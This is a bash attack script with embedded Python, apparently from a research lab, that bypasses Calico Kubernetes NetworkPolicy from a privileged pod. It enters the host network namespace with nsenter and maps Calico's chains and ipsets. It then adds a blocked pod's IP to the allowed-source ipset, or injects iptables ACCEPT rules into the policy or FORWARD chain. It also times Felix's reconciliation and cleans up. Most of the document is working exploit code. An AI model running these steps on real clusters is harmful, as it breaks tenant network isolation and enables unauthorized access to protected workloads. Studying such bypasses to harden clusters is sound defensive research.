#!/bin/bash
# Calico NetworkPolicy Bypass — Attack Script
#
# Runs INSIDE the privileged attack-pod. Tests two attack vectors:
#   1. ipset membership poisoning — add blocked pod's IP to Calico's allowed-source ipset
#      (analog to Cilium ipcache identity poisoning)
#   2. iptables rule injection    — insert ACCEPT rule into Calico's policy chain
#      (fallback if ipset approach fails)
#
# Usage (on the HOST):
#   kubectl exec -n calico-research attack-pod -- mkdir -p /attack
#   kubectl cp poc/calico_attack.sh calico-research/attack-pod:/attack/calico_attack.sh
#   kubectl exec -it -n calico-research attack-pod -- \
#       bash /attack/calico_attack.sh <target_ip> <blocked_ip> <allowed_ip>

set -uo pipefail

RED='\033[1;31m'; GREEN='\033[1;32m'; CYAN='\033[1;36m'
YELLOW='\033[1;33m'; BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

atk()     { echo -e "${RED}[ATTACK ]${NC} $*"; }
inf()     { echo -e "${YELLOW}[INFO   ]${NC} $*"; }
ok()      { echo -e "         ${BOLD}[+]${NC} $*"; }
fail()    { echo -e "${RED}[-]${NC} $*"; }
sep()     { echo -e "${DIM}──────────────────────────────────────────────────────${NC}"; }
section() { echo -e "\n${BOLD}$*${NC}"; sep; }

TARGET_IP="${1:?Usage: $0 <target_ip> <blocked_ip> <allowed_ip>}"
BLOCKED_IP="${2:?}"
ALLOWED_IP="${3:?}"

# All iptables/ipset commands run in the HOST network namespace via nsenter.
# The attack pod has hostPID:true and /proc mounted at /hostproc.
# PID 1 is always in the host network namespace.
NSENTER="nsenter --net=/hostproc/1/ns/net --"
IPT="$NSENTER iptables"
IPS="$NSENTER ipset"

# ── Phase 0: prerequisites ────────────────────────────────────────────────────
section "Phase 0: Install prerequisites"
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq 2>/dev/null
apt-get install -y -qq iptables ipset curl python3 iproute2 \
    2>&1 | grep -E "^(Unpacking|Setting up|E:)" || true

# Verify we can reach the host network namespace
if ! $NSENTER iptables -L INPUT -n > /dev/null 2>&1; then
    fail "Cannot access host network namespace via nsenter."
    fail "Ensure attack pod has: hostPID: true  and  /proc mounted at /hostproc"
    exit 1
fi
ok "Host netns accessible via nsenter"
ok "iptables: $($IPT --version 2>&1 | head -1)"
ok "ipset:    $($IPS --version 2>&1 | head -1)"
ok "python3:  $(python3 --version 2>&1)"

# ── Phase 1: Discovery ────────────────────────────────────────────────────────
section "Phase 1: Discover Calico iptables state"

inf "All Calico chains (cali-* prefix):"
$IPT -L -n 2>/dev/null | grep "^Chain cali" | awk '{print $2}' | sort
echo ""

inf "All Calico ipsets:"
$IPS list -n 2>/dev/null | grep -i cali | head -30 || true
echo ""

# Full iptables-save snapshot — used for chain tracing
$IPT-save 2>/dev/null > /tmp/calico_ipt_snapshot.txt || \
    $IPT -S 2>/dev/null > /tmp/calico_ipt_snapshot.txt
ok "iptables-save snapshot: $(wc -l < /tmp/calico_ipt_snapshot.txt) lines"
sep

# ── Phase 2: Baseline ─────────────────────────────────────────────────────────
section "Phase 2: Baseline — confirm NetworkPolicy is enforced"
echo -n "  attack-pod → policy-target ($TARGET_IP): "
if curl -s --max-time 3 "http://$TARGET_IP" -o /dev/null 2>/dev/null; then
    echo -e "${RED}ALLOWED${NC} (unexpected)"
else
    echo -e "${GREEN}BLOCKED${NC} ✓"
fi
inf "Verify from blocked-source (HOST):"
echo -e "  ${BOLD}kubectl exec -n calico-research blocked-source -- curl -s --max-time 3 http://$TARGET_IP${NC}"
sep

# ── Phase 3: Calico state analysis via Python ─────────────────────────────────
section "Phase 3: Analyze Calico policy chains"

export BLOCKED_IP ALLOWED_IP TARGET_IP

python3 << 'PYEOF'
"""
Parse iptables-save and ipset list to find:
  1. The ipset that contains allowed-source IP (Calico's pod selector set)
  2. The cali-pi-* policy inbound chain that enforces our NetworkPolicy
  3. The cali-tw-* to-workload chain for policy-target

Calico chain hierarchy for ingress NetworkPolicy:
  FORWARD
    → cali-FORWARD
      → cali-to-wl-dispatch
        → cali-tw-<ep-hash>          (to-workload, per endpoint)
          → cali-pi-<policy-hash>    (policy inbound, per policy)
            ACCEPT  if src ∈ ipset cali40s:<selector-hash>
            DROP    (default deny)
"""
import subprocess, re, sys, os

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'
BOLD='\033[1m'; NC='\033[0m'

BLOCKED = os.environ['BLOCKED_IP']
ALLOWED = os.environ['ALLOWED_IP']
TARGET  = os.environ['TARGET_IP']
NSBASE  = "nsenter --net=/hostproc/1/ns/net --"

def run(cmd):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return r.stdout.strip(), r.stderr.strip(), r.returncode

# ── find the ipset containing ALLOWED_IP ─────────────────────────────────────
print(f"{YELLOW}[INFO   ]{NC} Scanning ipsets for {ALLOWED}...")
sets_out, _, _ = run(f"{NSBASE} ipset list 2>/dev/null")
found_set = None
current_set = None

for line in sets_out.split('\n'):
    name_m = re.match(r'^Name:\s+(\S+)', line)
    if name_m:
        current_set = name_m.group(1)
    if current_set and ALLOWED in line:
        found_set = current_set
        break

if found_set:
    print(f"{GREEN}[+      ]{NC} allowed-source ({ALLOWED}) is in ipset: {BOLD}{found_set}{NC}")
    # Show current members
    members_out, _, _ = run(f"{NSBASE} ipset list {found_set} 2>/dev/null")
    members = [l.strip() for l in members_out.split('\n')
               if l.strip() and not l.startswith(('Name','Type','Revision','Header','Size','References','Number','Members'))]
    print(f"         Current members: {members}")
    open('/tmp/calico_target_ipset', 'w').write(found_set)
    open('/tmp/calico_allowed_members', 'w').write('\n'.join(members))
else:
    print(f"{YELLOW}[INFO   ]{NC} allowed-source not found in any ipset — Calico may use direct IP rules")
    print(f"         (common with very small clusters or calico v3.26+ with eBPF mode)")

# ── find the cali-tw-* chain for policy-target ────────────────────────────────
print(f"\n{YELLOW}[INFO   ]{NC} Finding to-workload chain for {TARGET}...")
ipt_snap = open('/tmp/calico_ipt_snapshot.txt').read()

# cali-to-wl-dispatch dispatches by dest IP — find the rule matching TARGET
# Format: -A cali-to-wl-dispatch -d <ip>/32 -g cali-tw-<hash>
tw_chain = None
for line in ipt_snap.split('\n'):
    if 'cali-to-wl-dispatch' in line and TARGET in line:
        m = re.search(r'-g (cali-tw-\S+)', line)
        if m:
            tw_chain = m.group(1)
            break

if tw_chain:
    print(f"{GREEN}[+      ]{NC} to-workload chain: {BOLD}{tw_chain}{NC}")
    open('/tmp/calico_tw_chain', 'w').write(tw_chain)
else:
    print(f"{YELLOW}[INFO   ]{NC} cali-to-wl-dispatch chain not found for {TARGET}")
    print(f"         Dumping dispatch rules:")
    for line in ipt_snap.split('\n'):
        if 'cali-to-wl-dispatch' in line:
            print(f"  {line.strip()}")

# ── find the cali-pi-* policy inbound chain ────────────────────────────────────
print(f"\n{YELLOW}[INFO   ]{NC} Finding policy inbound chain...")
pi_chain = None

if tw_chain:
    # Look for the jump from tw_chain to a cali-pi-* chain
    in_tw = False
    for line in ipt_snap.split('\n'):
        if f'-A {tw_chain}' in line:
            in_tw = True
        if in_tw and 'cali-pi-' in line:
            m = re.search(r'(cali-pi-\S+)', line)
            if m:
                pi_chain = m.group(1)
                break

if pi_chain:
    print(f"{GREEN}[+      ]{NC} policy inbound chain: {BOLD}{pi_chain}{NC}")
    # Show its rules
    pi_rules = [l for l in ipt_snap.split('\n') if f'-A {pi_chain}' in l]
    print(f"         Rules ({len(pi_rules)}):")
    for r in pi_rules:
        print(f"  {r.strip()}")
    open('/tmp/calico_pi_chain', 'w').write(pi_chain)
else:
    # Fallback: dump all cali-pi-* chains and their rules
    print(f"{YELLOW}[INFO   ]{NC} Searching all cali-pi-* chains for DROP rules:")
    chains = set(re.findall(r'-A (cali-pi-\S+)', ipt_snap))
    for ch in sorted(chains)[:10]:
        rules = [l.strip() for l in ipt_snap.split('\n') if f'-A {ch}' in l]
        if any('DROP' in r or 'REJECT' in r for r in rules):
            print(f"  {ch}: {rules}")
            if not pi_chain:
                pi_chain = ch
                open('/tmp/calico_pi_chain', 'w').write(pi_chain)

print(f"\n{BOLD}Summary:{NC}")
print(f"  allowed ipset:     {found_set or '(not found)'}")
print(f"  to-workload chain: {tw_chain or '(not found)'}")
print(f"  policy chain:      {pi_chain or '(not found)'}")
PYEOF

sep

# ── Phase 4a: Attack — ipset membership poisoning ─────────────────────────────
section "Phase 4a: ipset Membership Poisoning (analog to Cilium ipcache)"
atk "Adding blocked-source IP to Calico's allowed-source ipset"
echo ""

if [ ! -f /tmp/calico_target_ipset ]; then
    inf "ipset not found — skipping to Phase 4b (iptables rule injection)"
else
    TARGET_SET=$(cat /tmp/calico_target_ipset)
    atk "Ipset:  $TARGET_SET"
    atk "Adding: $BLOCKED_IP → $TARGET_SET"

    if $IPS add "$TARGET_SET" "$BLOCKED_IP" 2>/dev/null; then
        echo -e "\n${RED}${BOLD}★  IPSET POISONED  ★${NC}"
        echo -e "   $BLOCKED_IP added to $TARGET_SET"
        echo -e "   Calico's iptables rules will now treat blocked-source as allowed-source"
        echo "1" > /tmp/calico_ipset_poisoned
        echo "$TARGET_SET" >> /tmp/calico_ipset_poisoned

        echo ""
        echo "════════════════════════════════════════════════════"
        echo -e "  ${RED}RUN THIS IN ANOTHER TERMINAL NOW:${NC}"
        echo "  kubectl exec -n calico-research blocked-source -- \\"
        echo "      curl -sv --max-time 5 http://$TARGET_IP"
        echo "  Expected: HTTP 200 + nginx HTML  (policy BYPASSED)"
        echo "════════════════════════════════════════════════════"
    else
        ERRNO=$?
        fail "ipset add failed (exit $ERRNO)"
        inf "May need ipset CIDR format: trying $BLOCKED_IP/32 ..."
        if $IPS add "$TARGET_SET" "$BLOCKED_IP/32" 2>/dev/null; then
            echo "1" > /tmp/calico_ipset_poisoned
            echo "$TARGET_SET" >> /tmp/calico_ipset_poisoned
            ok "Added $BLOCKED_IP/32 to $TARGET_SET"
        else
            fail "ipset add (CIDR) also failed — falling through to Phase 4b"
        fi
    fi
fi

sep

# ── Phase 4b: Attack — iptables rule injection (fallback) ─────────────────────
if [ ! -f /tmp/calico_ipset_poisoned ]; then
    section "Phase 4b: iptables Rule Injection"
    atk "Inserting ACCEPT rule into Calico's policy inbound chain"
    echo ""

    PI_CHAIN=""
    [ -f /tmp/calico_pi_chain ] && PI_CHAIN=$(cat /tmp/calico_pi_chain)

    if [ -n "$PI_CHAIN" ]; then
        atk "Chain: $PI_CHAIN"
        atk "Inserting: -I $PI_CHAIN 1 -s $BLOCKED_IP -j ACCEPT"
        if $IPT -I "$PI_CHAIN" 1 -s "$BLOCKED_IP" -j ACCEPT 2>/dev/null; then
            echo -e "\n${RED}${BOLD}★  IPTABLES RULE INJECTED  ★${NC}"
            echo -e "   ACCEPT $BLOCKED_IP inserted at top of $PI_CHAIN"
            echo "1" > /tmp/calico_ipt_injected
            echo "$PI_CHAIN" >> /tmp/calico_ipt_injected

            echo ""
            echo "════════════════════════════════════════════════════"
            echo -e "  ${RED}RUN THIS IN ANOTHER TERMINAL NOW:${NC}"
            echo "  kubectl exec -n calico-research blocked-source -- \\"
            echo "      curl -sv --max-time 5 http://$TARGET_IP"
            echo "  Expected: HTTP 200 + nginx HTML  (policy BYPASSED)"
            echo "════════════════════════════════════════════════════"
        else
            fail "iptables insert failed"
            inf "Trying FORWARD chain direct injection as last resort..."
            if $IPT -I FORWARD 1 -s "$BLOCKED_IP" -d "$TARGET_IP" -j ACCEPT 2>/dev/null; then
                echo -e "${RED}${BOLD}★  FORWARD CHAIN INJECTED  ★${NC}"
                echo "forward" > /tmp/calico_ipt_injected
            fi
        fi
    else
        atk "Policy chain not found — injecting into FORWARD directly"
        atk "Inserting: FORWARD -s $BLOCKED_IP -d $TARGET_IP -j ACCEPT"
        if $IPT -I FORWARD 1 -s "$BLOCKED_IP" -d "$TARGET_IP" -j ACCEPT 2>/dev/null; then
            echo -e "\n${RED}${BOLD}★  FORWARD CHAIN INJECTED  ★${NC}"
            echo "forward" > /tmp/calico_ipt_injected
            echo ""
            echo "════════════════════════════════════════════════════"
            echo -e "  ${RED}RUN THIS IN ANOTHER TERMINAL NOW:${NC}"
            echo "  kubectl exec -n calico-research blocked-source -- \\"
            echo "      curl -sv --max-time 5 http://$TARGET_IP"
            echo "════════════════════════════════════════════════════"
        fi
    fi
fi
sep

# ── Phase 5: Monitor Felix recovery ──────────────────────────────────────────
section "Phase 5: Monitor Felix reconciliation"
inf "Felix default iptablesRefreshInterval = 90 s"
inf "Polling every 3 s for up to 120 s..."
echo ""

ATTACK_START=$(date +%s%3N)
RECOVERED=0

for i in $(seq 1 40); do
    sleep 3
    NOW=$(date +%s%3N); ELAPSED=$(( NOW - ATTACK_START ))
    TS=$(date '+%H:%M:%S')

    if [ -f /tmp/calico_ipset_poisoned ]; then
        TARGET_SET=$(sed -n '2p' /tmp/calico_ipset_poisoned)
        # Check if blocked IP is still in the ipset
        if $IPS test "$TARGET_SET" "$BLOCKED_IP" 2>/dev/null || \
           $IPS test "$TARGET_SET" "$BLOCKED_IP/32" 2>/dev/null; then
            echo -e "  ${RED}[!]${NC} $TS  $BLOCKED_IP still in $TARGET_SET  (${ELAPSED} ms)"
        else
            echo -e "  ${GREEN}[+]${NC} $TS  $BLOCKED_IP REMOVED from $TARGET_SET  (${ELAPSED} ms)"
            echo "$ELAPSED" > /tmp/calico_recovery_ms
            RECOVERED=1
            break
        fi
    elif [ -f /tmp/calico_ipt_injected ]; then
        PI=$(cat /tmp/calico_ipt_injected | tail -1)
        if [ "$PI" = "forward" ]; then
            RULE_COUNT=$($IPT -L FORWARD -n 2>/dev/null | grep -c "$BLOCKED_IP" || echo 0)
        else
            RULE_COUNT=$($IPT -L "$PI" -n 2>/dev/null | grep -c "$BLOCKED_IP" || echo 0)
        fi
        if [ "$RULE_COUNT" -gt 0 ]; then
            echo -e "  ${RED}[!]${NC} $TS  injected ACCEPT rule still present  (${ELAPSED} ms)"
        else
            echo -e "  ${GREEN}[+]${NC} $TS  Felix removed injected rule  (${ELAPSED} ms)"
            echo "$ELAPSED" > /tmp/calico_recovery_ms
            RECOVERED=1
            break
        fi
    else
        inf "No active attack state to monitor"
        break
    fi
done

if [ "$RECOVERED" -eq 0 ]; then
    NOW=$(date +%s%3N); ELAPSED=$(( NOW - ATTACK_START ))
    echo -e "\n  ${RED}[!!]${NC} Felix did NOT correct the state in ${ELAPSED} ms"
    echo -e "       This exceeds the expected 90 s reconciliation interval."
    echo "-1" > /tmp/calico_recovery_ms
fi

sep

# ── Phase 6: Cleanup attack state ─────────────────────────────────────────────
section "Phase 6: Cleanup attack state"

if [ -f /tmp/calico_ipset_poisoned ]; then
    TARGET_SET=$(sed -n '2p' /tmp/calico_ipset_poisoned)
    $IPS del "$TARGET_SET" "$BLOCKED_IP"    2>/dev/null || true
    $IPS del "$TARGET_SET" "$BLOCKED_IP/32" 2>/dev/null || true
    ok "Removed $BLOCKED_IP from $TARGET_SET"
    rm -f /tmp/calico_ipset_poisoned
fi

if [ -f /tmp/calico_ipt_injected ]; then
    PI=$(cat /tmp/calico_ipt_injected | tail -1)
    if [ "$PI" = "forward" ]; then
        $IPT -D FORWARD -s "$BLOCKED_IP" -d "$TARGET_IP" -j ACCEPT 2>/dev/null || true
        ok "Removed FORWARD ACCEPT rule"
    else
        $IPT -D "$PI" -s "$BLOCKED_IP" -j ACCEPT 2>/dev/null || true
        ok "Removed injected ACCEPT from $PI"
    fi
    rm -f /tmp/calico_ipt_injected
fi
sep

# ── Phase 7: Summary ──────────────────────────────────────────────────────────
section "Phase 7: Research Summary"
echo ""

echo -e "${BOLD}Attack vector 1: ipset membership poisoning${NC}"
echo   "  Calico uses ipsets to represent pod selectors in NetworkPolicy."
echo   "  The ipset containing allowed-source's IP is directly modifiable"
echo   "  by any privileged container running in the host network namespace."
echo   "  Adding blocked-source's IP to the allowed ipset makes Calico's"
echo   "  iptables rules treat it as a permitted source — identical to the"
echo   "  Cilium ipcache SecurityIdentity spoofing attack."
if [ -f /tmp/calico_recovery_ms ]; then
    REC=$(cat /tmp/calico_recovery_ms)
    [ "$REC" = "-1" ] \
        && echo -e "  ${RED}Felix correction: NOT OBSERVED (120 s window)${NC}" \
        || echo -e "  ${RED}Felix correction: ${REC} ms${NC}"
fi
echo ""

echo -e "${BOLD}Attack vector 2: iptables rule injection${NC}"
echo   "  Direct iptables ACCEPT rules bypass Calico's policy chains entirely."
echo   "  Felix's iptablesRefreshInterval (default 90 s) defines the recovery window."
echo   "  Unlike Cilium's TC link watchdog (2 s recovery), Felix does not use"
echo   "  inotify on iptables state — it polls on a fixed interval."
echo ""

echo -e "${BOLD}Comparison to Cilium attack:${NC}"
echo   "  Cilium: modify BPF map (cilium_ipcache_v2) via bpf() syscall"
echo   "  Calico: modify ipset membership or iptables rules via userspace tools"
echo   "  Calico attack requires only NET_ADMIN (implicit in privileged pod)."
echo   "  No BPF knowledge needed. Any privileged container can run iptables."
echo ""

echo -e "${BOLD}Preconditions:${NC} privileged pod + hostPID:true + /proc hostPath mount"
echo -e "${DIM}Cleanup: kubectl delete namespace calico-research${NC}"
